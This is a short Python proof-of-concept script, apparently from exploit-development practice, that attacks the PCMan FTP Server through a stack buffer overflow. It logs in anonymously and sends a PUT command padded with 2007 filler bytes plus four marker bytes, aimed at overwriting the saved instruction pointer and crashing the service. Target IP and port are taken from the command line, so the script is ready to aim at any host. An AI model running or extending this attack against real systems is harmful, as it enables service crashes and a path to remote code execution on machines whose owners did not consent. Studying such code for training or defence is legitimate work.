#!/usr/bin/python3
import argparse, socket


def execute(ip, port):    
    buffer = "A" * 2007
    buffer += "B" * 4
    print("Sending pattern")
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect=s.connect((ip,port))
    s.recv(1024)
    s.send(b'USER anonymous\r\n')
    s.recv(1024)
    s.send(b'PASS anonymous\r\n')
    s.recv(1024)
    s.send(b'PUT' + bytes(buffer, "ISO-8859-1"))
    s.recv(1024)
    s.close()


def main():
    '''Grabs user arguments and calls appropriate functions.'''
    parser = argparse.ArgumentParser(description='Provide the url for the vulnerable pcman ftp server.')
    parser.add_argument('-v', '--version', dest='ver', required=False, action='store_true', help='display version number.')
    parser.add_argument('-t', '--target', dest='target', required=False, type=str, help="provide a target url ex: 10.10.10.10")
    parser.add_argument('-p', '--port', dest='port', required=False, type=int, help="provide a target port ex: -p 21")
    args = parser.parse_args()
    target_ip = args.target
    target_port = args.port

    if args.ver:
        print("PCManFTPServerb0f version 0.1")
        exit()
    if (not target_ip) or (not target_port):
        print('Usage: python3 PCManFTPServerb0f.py -t <address> -p <port>')
        exit(0)
    else:
        print("[+] Running b0f against:", target_ip, target_port)
        execute(target_ip, target_port)
        
if __name__ == '__main__':
    main()
